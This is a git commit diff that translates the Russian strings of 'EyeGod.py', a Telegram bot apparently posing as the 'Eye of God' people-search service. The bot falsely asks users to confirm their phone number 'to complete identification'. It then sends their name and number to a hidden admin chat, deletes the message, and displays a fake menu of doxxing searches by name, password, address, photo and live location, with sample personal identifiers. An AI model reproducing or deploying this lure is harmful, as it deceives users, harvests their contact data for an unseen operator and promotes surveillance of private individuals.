70043f252c27435a16dd6c800b4f6f05708ee7a0
Bmgpt <137195478+Bmgpt@users.noreply.github.com>
2024-06-20 02:19:01 +0800

    Update EyeGod.py

--- src/windows/Modules/Bots/EyeGod.py
+++ src/windows/Modules/Bots/EyeGod.py
@@ -5,10 +5,10 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 import importlib.util
 
-# Определение пути к config.py
+# Define the path to config.py
 config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')
 
-# Загрузка конфигурации
+# Load the configuration
 spec = importlib.util.spec_from_file_location("config", config_path)
 config = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(config)
@@ -21,48 +21,48 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 
-#Обработчик start
+# Handler for the start command
 @dp.message_handler(commands=['start'])
 async def on_start(message: types.Message):
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    button = types.KeyboardButton(text="✅ Подтвердить номер телефона", request_contact=True)
+    button = types.KeyboardButton(text="✅ Confirm phone number", request_contact=True)
     keyboard.add(button)
     
-    await message.answer("<b>🗂 Номер телефона\n\n"
-                         "Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию.\n\n"
-                         "Для этого нажмите кнопку ниже.</b>", reply_markup=keyboard, parse_mode="HTML")
+    await message.answer("<b>🗂 Phone Number\n\n"
+                         "You need to confirm your phone number to complete the identification.\n\n"
+                         "To do this, press the button below.</b>", reply_markup=keyboard, parse_mode="HTML")
 
-#Обработчик контакта
+# Handler for contact information
 @dp.message_handler(content_types=[types.ContentType.CONTACT])
 async def on_contact_received(message: types.Message):
     contact = message.contact
-    await message.answer("Вы успешно идентифицированы.", reply_markup=types.ReplyKeyboardRemove())
+    await message.answer("You have been successfully identified.", reply_markup=types.ReplyKeyboardRemove())
     
     await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
 
-    # Отправка сообщения админу
-    admin_message = (f"Получен новый контакт:\n"
-                     f"Имя: {contact.first_name}\n"
-                     f"Номер телефона: {contact.phone_number}")
+    # Send a message to the admin
+    admin_message = (f"New contact received:\n"
+                     f"Name: {contact.first_name}\n"
+                     f"Phone number: {contact.phone_number}")
     await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
 
-    # Отправка инструкций пользователю
+    # Send instructions to the user
     await bot.send_message(chat_id=message.chat.id, text=(
-        "Вы можете присылать запросы боту в таком порядке:\n\n"
-        "👤 Поиск по имени\n├  `Блогер`\n├  `Проскура Валерий`\n├  `Проскура Валерий Николаевич`\n└  `Устимова Ольга Сергеевна 29.03.1983`\n\n"
-        "🚗 Поиск по авто\n├  `М999ММ99` - поиск авто по РФ\n├  `ВО4561АХ` - поиск авто по УК\n└  `ХТА21150053965897` - поиск по VIN\n\n"
-        "👨 Социальные сети\n├  `https://vk.com/id1` - Вконтакте\n├  `https://www.facebook.com/profile.php?id=1` - Facebook\n└  `https://ok.ru/profile/464476975745` - Однокласссники\n\n"
-        "📱 `79998887777` - для поиска по номеру телефона\n📨 `name@mail.ru` - для поиска по Email\n📧 @slivmenss или перешлите сообщение - поиск по Telegram аккаунту \n\n"
-        "🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю \n"
-        "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ) \n\n"
-        "🏛 `/company Сбербанк` - поиск по юр лицам \n"
-        "📑 `/inn 784806113663` - поиск по ИНН \n\n"
-        "🌐 `8.8.8.8` или `https://google.com` - информация об IP или домене \n"
-        "💰 `1AmajNxtJyU7JjAuyiFFkqDaaxuYqkNSkF` - информация о Bitcoin адресе \n\n"
-        "📸 Отправьте *фото человека*, что бы найти его или двойника в сети Вконтакте. \n"
-        "🚙 Отправьте *фото номера автомобиля*, что бы получить о нем информацию. \n"
-        "🌎 Отправьте *точку на карте*, чтобы найти людей которые сейчас там. \n"
-        "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*."
+        "You can send requests to the bot in the following order:\n\n"
+        "👤 Search by name\n├  `Blogger`\n├  `Proskura Valery`\n├  `Proskura Valery Nikolaevich`\n└  `Ustimova Olga Sergeevna 29.03.1983`\n\n"
+        "🚗 Search by car\n├  `M999MM99` - search for a car in Russia\n├  `VO4561AX` - search for a car in Ukraine\n└  `HTA21150053965897` - search by VIN\n\n"
+        "👨 Social networks\n├  `https://vk.com/id1` - VKontakte\n├  `https://www.facebook.com/profile.php?id=1` - Facebook\n└  `https://ok.ru/profile/464476975745` - Odnoklassniki\n\n"
+        "📱 `79998887777` - to search by phone number\n📨 `name@mail.ru` - to search by Email\n📧 @slivmenss or forward a message - search by Telegram account \n\n"
+        "🔐 `/pas churchill7` - search for email, login, and phone by password \n"
+        "🏚 `/adr Moscow, Tverskaya, 1, apt 1` - information by address (Russia) \n\n"
+        "🏛 `/company Sberbank` - search by company name \n"
+        "📑 `/inn 784806113663` - search by TIN \n\n"
+        "🌐 `8.8.8.8` or `https://google.com` - information about IP or domain \n"
+        "💰 `1AmajNxtJyU7JjAuyiFFkqDaaxuYqkNSkF` - information about Bitcoin address \n\n"
+        "📸 Send a *photo of a person* to find them or their lookalike on VKontakte. \n"
+        "🚙 Send a *photo of a car number* to get information about it. \n"
+        "🌎 Send a *location on the map* to find people who are there now. \n"
+        "🗣 Using *voice commands*, you can also perform *search queries*."
     ), parse_mode="Markdown")
 
 if __name__ == '__main__':
